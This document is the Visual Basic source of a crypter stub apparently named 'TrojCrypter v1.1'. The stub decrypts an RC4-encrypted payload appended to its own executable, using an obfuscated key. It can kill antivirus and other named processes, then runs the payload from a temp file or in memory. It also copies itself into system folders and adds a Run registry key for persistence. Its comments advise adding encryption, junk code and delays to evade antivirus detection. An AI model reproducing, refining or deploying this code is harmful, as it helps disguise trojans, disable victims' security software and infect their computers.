Attribute VB_Name = "Stub"
'TrojCrypter v1.1
'.fuajuar
'This is old source and has been tagged by several av
'You can improve this code by encrypting all functions,
'adding junk codes, delay etc

Private Declare Function CopyFile Lib "kernel32" Alias "CopyFileA" (ByVal lpExistingFileName As String, ByVal lpNewFileName As String, ByVal bFailIfExists As Long) As Long
Dim PropBag As New PropertyBag

Public Function Random(ByVal Low As Long, ByVal High As Long) As Long
Randomize
Random = Int((High - Low + 1) * Rnd) + Low
End Function

Public Sub Main()
Dim contents As String
Dim path, cmb, startup, kl, run, custom As String
Dim bagian As Variant
Dim byteArr() As Byte
Dim stub As String
Dim file As String
Dim temp As String
Dim Key As String
Dim fileSign As String
Dim tmp As String
Dim path2 As String

Key = Chr(80) + Chr(97) + Chr(115) + Chr(115) + Chr(119) + Chr(48) + Chr(114) + Chr(100)  'Passw0rd
fileSign = Chr(36) + Chr(36) + Chr(45) + Chr(45) + Chr(36) + Chr(36) '$$--$$

On Error Resume Next

Open App.path & "\" & App.EXEName & ".exe" For Binary As #1
contents = Space(LOF(1))
Get #1, , contents
Close #1

'-----modify this-----
bagian = Split(contents, "%-ff-%")
contents = bagian(1)
contents = RC4(contents, Key)
run = bagian(2)
kl = bagian(3)
startup = bagian(4)
path = bagian(5)
cmb = bagian(6)
custom = bagian(7)
'---------end---------

If custom <> "0" Then KillApp custom
If kl = "1" Then Call Kill_AV

If cmb = "%WinDir%" Then path2 = Environ("windir") & "\"
If cmb = "%SysDir%" Then path2 = Environ("windir") & "\system32\"
If cmb = "%Temp%" Then path2 = Environ("tmp") & "\"

If run = "y" Then
Randomize
tmp = Environ("tmp") & "\" & Random(0, 999999999) & ".exe"
Open tmp For Binary As #1
Put #1, , contents
Close #1
Shell tmp, vbNormalFocus
Else
'-----modify this-----
nmbrrtg App.path & "\" & App.EXEName & ".exe", StrConv(contents, vbFromUnicode)
'---------end---------
End If

Dim filesiz
filesiz = FileLen(App.path & "\" & App.EXEName & ".exe")
If startup = "1" Then
Open App.path & "\" & App.EXEName & ".exe" For Binary Access Read As #1
stub = Space(filesiz)
Get #1, , stub
Close #1
Open path2 & path For Binary Access Write As #1
Put #1, , stub
Close #1

Dim nBufferKey As Long, nBufferSubKey As Long
RegOpenKey CURRENTUSER, "Software\Microsoft\Windows\CurrentVersion", nBufferKey
RegOpenKey nBufferKey, "Run", nBufferSubKey
RegSetValueEx nBufferSubKey, "Load", 0, REG_SZ, path2 & path, Len(path2 & path)
Else
End If

End
End Sub

